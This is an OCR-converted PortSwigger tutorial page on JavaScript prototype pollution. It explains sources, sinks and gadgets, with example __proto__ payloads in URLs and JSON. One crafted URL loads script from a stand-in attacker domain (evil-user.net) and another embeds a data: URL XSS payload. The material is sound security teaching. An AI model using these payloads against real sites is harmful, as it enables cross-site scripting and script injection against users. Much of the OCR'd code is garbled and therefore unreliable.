# What is prototype pollution_

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `24fd0f965e909b36932b307477198c7da0e8fbef5525ed67eb44fdd2589ce288`.
> Conversion: Local English OCR, all 5 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


Prototype pollution

## What is prototype pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

Website

Object.prototype —proto_ n sport—url -evil-user.net transport_url: •evil-user.net' userObject

targetObject recursiveMerge()

config defaults transport_url: 'evil-user.net' transport_url: 'normal-website.com'

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution. If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing. JavaScript prototypes and inheritance

If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic. View all prototype pollution labs

## How do prototype pollution vulnerabilities arise?

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user- controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a

---

Due to the special meaning of proto in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way. It's possible to pollute any prototype object, but this most commonly occurs with the built-in global Obj ect . prototype Successful exploitation of prototype pollution requires the following key components:

- A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.

- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.

- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows: The URL via either the query or fragment string (hash) JSON-based input . Web messages

Prototype pollution via the URL Consider the following URL, which contains an attacker-constructed query string: https : / / vulnerable-website . com/? proto [evil Property] —payload When breaking the query string down into key : value pairs, a URL parser may interpret proto as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties. You might think that the proto property, along with its nested evil Property , will just be added to the target object as follows:

exxstingProperty1 : ' foo ' existing Property2 : 'bar' proto evil Property: 'payload'

However, this isn't the case. At some point, the recursive merge operation may assign the value of evil Property using a statement equivalent to the following: targetObj ect . _proto . evil Property = 'payload' • During this assignment, the JavaScript engine treats proto as a getter for the prototype. As a result, evil Property is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Obj ect . prototype , all objects in the JavaScript runtime will now inherit evil Property , unless they already have a property of their own with a matching key. In practice, injecting a property called evil Property is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

Prototype pollution via JSON input User-controllable objects are often derived from a JSON string using the JSON . parse ( ) method. Interestingly, JSON . parse ( ) also treats any key in the JSON object as an arbitrary string, including things like This proto provides another potential vector for prototype pollution.

---

proto " evilProperty": "payload"

If this is converted into a JavaScript object via the JSON . parse ( ) method, the resulting object will in fact have a property with the key proto

```text
const obj ectLiteraI
```

{ proto {evil Property: 'payload' } }

```text
const obj ectFromJson =
```

JSON . parse (' { " proto { "evil Property": "payload" ) } '

obj ectLiteraI . hasOwnProperty ( proto obj ectFromJson . hasOwnProperty ( ' // true proto If the object created via JSON .parse ( ) is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS. As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.

- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of

the property added to the prototype by an attacker. A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to null , which ensures that it doesn't inherit any properties at all.

Example of a prototype pollution gadget Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

```text
let transport _ url —
```

config. transport _ url I I defaults . transport_url;

Now imagine the library code uses this transport url to add a script reference to the page:

```text
let script
```

document . createE1ement ( ' script ' ) ; script. src = $ {transport ur I}/ example.js document . body . appendChi1d (script) ; If the website's developers haven't seta transport url property on their config object, this is a potential gadget. In cases where an attacker is able to pollute the global Object . prototype with their own transport url property,

---

choosing. If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain: https : / / vulnerable—website . com/? proto [transport url] / evil—user . net

By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows: https : / / vulnerable—website . com/? proto [transport ur I] —data: , alert (I) ; //

Note that the trailing // in this example is simply to comment out the hardcoded /example . JS suffix.

What next? Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications: Client-side prototype pollution vulnerabilities Server-side prototype pollution vulnerabilities Preventing prototype pollution vulnerabilities

---

## PortSwig(.

Vulnerabilities Customers Insights Web vulnerability scanner Cross-site scripting (XSS) Organizations About Burp Suite Editions SQL injection Testers Careers Blog Release Notes Cross-site request forgery Developers Contact Research @ 2026 PortSwigger LtC XML external entity injection Directory traversal Privacy Notice Server-side request forgery Modern Slavery Statement
